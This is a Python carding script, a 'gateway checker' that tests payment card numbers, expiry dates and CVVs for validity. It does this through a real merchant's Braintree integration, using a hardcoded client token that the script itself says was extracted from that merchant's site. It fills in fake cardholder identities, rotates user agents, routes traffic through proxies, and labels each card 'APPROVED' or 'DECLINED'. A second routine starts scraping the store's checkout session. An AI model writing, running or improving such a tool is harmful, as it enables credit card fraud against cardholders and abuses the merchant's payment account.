"""
Braintree Direct Payment Gateway Checker
Uses hardcoded Bearer token for Braintree GraphQL tokenization
Works via rotometals.com merchant integration with BigCommerce
"""

import requests
import json
import random
from typing import Tuple
from faker import Faker
import time


BRAINTREE_AUTH = "Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjczMjg4NzMsImp0aSI6IjcxNmQ3ZDFhLTUyMDgtNDkzNy04YTdkLWY0OGYzZDg0NWI4OCIsInN1YiI6Imh4ZGNmcDVoeWZmNmgzNzYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imh4ZGNmcDVoeWZmNmgzNzYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJhdWQiOlsicm90b21ldGFscy5jb20iLCJ3d3cucm90b21ldGFscy5jb20iXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJyb3RvbWV0YWxzaW5jX2luc3RhbnQiLCJwYXlwYWxfY2xpZW50X2lkIjoiQVZQVDYwNHV6VjEtM0o1MHNvUzVfYUtOWHliaDdmZEtCUHJFZk12QlJMS2MtbkxETjlINTI1bXF4cHFaSmd1R2pMUUREc0J1bW14UU9Bc1QifX0.MVV27c5bHYy-6PJ1Oo7S4uKqwuNPlpqXdaezIi5CwlzolgABxZYATBQ336jwTGOHjFXot4ZWldW8NDUhUTMdHA"


def _random_user_agent():
    """Generate random mobile/desktop user agent"""
    agents = [
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    ]
    return random.choice(agents)


def _tokenize_card(card_num: str, card_mon: str, card_yer: str, card_cvc: str, session: requests.Session) -> Tuple[str, str]:
    """
    Tokenize card via Braintree GraphQL API
    Returns (token, error_msg)
    """
    url = "https://payments.braintree-api.com/graphql"
    
    if len(card_yer) == 2:
        full_year = f"20{card_yer}"
    else:
        full_year = card_yer
    
    fake = Faker()
    cardholder = f"{fake.first_name()} {fake.last_name()}"
    
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(1000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": card_num,
                    "expirationMonth": card_mon,
                    "expirationYear": full_year,
                    "cvv": card_cvc,
                    "cardholderName": cardholder,
                    "billingAddress": {
                        "countryName": "United States",
                        "postalCode": fake.zipcode(),
                        "streetAddress": fake.street_address()
                    }
                },
                "options": {
                    "validate": False
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': BRAINTREE_AUTH,
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': _random_user_agent(),
    }
    
    try:
        response = session.post(url, json=payload, headers=headers, timeout=30)
        
        if response.status_code == 401:
            return (None, "Auth token expired")
        
        if response.status_code >= 400:
            return (None, f"API error {response.status_code}")
        
        data = response.json()
        
        if 'errors' in data:
            error_msg = data['errors'][0].get('message', 'Unknown error')
            return (None, error_msg)
        
        token = data.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        if token:
            return (token, None)
        
        return (None, "No token in response")
        
    except requests.exceptions.Timeout:
        return (None, "Timeout")
    except Exception as e:
        return (None, str(e)[:50])


def _get_fresh_jwt(session: requests.Session) -> Tuple[str, str, str]:
    """
    Get fresh BigCommerce JWT by starting checkout on rotometals.com
    Returns (jwt_token, order_id, error_msg)
    """
    fake = Faker()
    
    try:
        session.get("https://www.rotometals.com/", timeout=15)
        
        product_url = "https://www.rotometals.com/antimony-shot-1-pound-99-6-minimum-pure/"
        resp = session.get(product_url, timeout=15)
        
        if resp.status_code != 200:
            return (None, None, "Product page failed")
        
        cart_payload = {
            "action": "add",
            "product_id": 1029,
            "qty[]": 1,
        }
        
        add_resp = session.post(
            "https://www.rotometals.com/cart.php",
            data=cart_payload,
            timeout=15,
            allow_redirects=True
        )
        
        checkout_resp = session.get(
            "https://www.rotometals.com/checkout",
            timeout=15
        )
        
        return (None, None, "JWT extraction requires live checkout session")
        
    except Exception as e:
        return (None, None, str(e)[:50])


def braintree_direct_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy=None) -> Tuple[str, bool]:
    """
    Check card via Braintree Direct API with hardcoded auth token
    
    This gate uses a pre-extracted Bearer token from rotometals.com merchant.
    Token is valid until ~Jan 1, 2026.
    
    Flow:
    1. Tokenize card via Braintree GraphQL API
    2. Tokenization response indicates card validity
    
    Returns: (status_message, proxy_used)
    """
    
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    
    session.headers.update({
        'User-Agent': _random_user_agent(),
        'Accept': 'application/json',
    })
    
    token, error = _tokenize_card(card_num, card_mon, card_yer, card_cvc, session)
    
    if error:
        if 'expired' in error.lower():
            return ("DECLINED ❌ Auth token expired", False)
        elif 'invalid' in error.lower() and 'card' in error.lower():
            return ("DECLINED ❌ Invalid card number", True)
        elif 'cvv' in error.lower():
            return ("DECLINED ❌ CVV error", True)
        elif 'expir' in error.lower():
            return ("DECLINED ❌ Expired card", True)
        else:
            return (f"DECLINED ❌ {error}", False)
    
    if token:
        return (f"APPROVED ✅ Token: {token[:20]}...", True)
    
    return ("DECLINED ❌ No token received", False)


def health_check() -> bool:
    """Quick health check for Braintree API"""
    try:
        headers = {
            'authorization': BRAINTREE_AUTH,
            'content-type': 'application/json',
        }
        response = requests.options(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            timeout=5
        )
        return response.status_code < 500
    except:
        return False
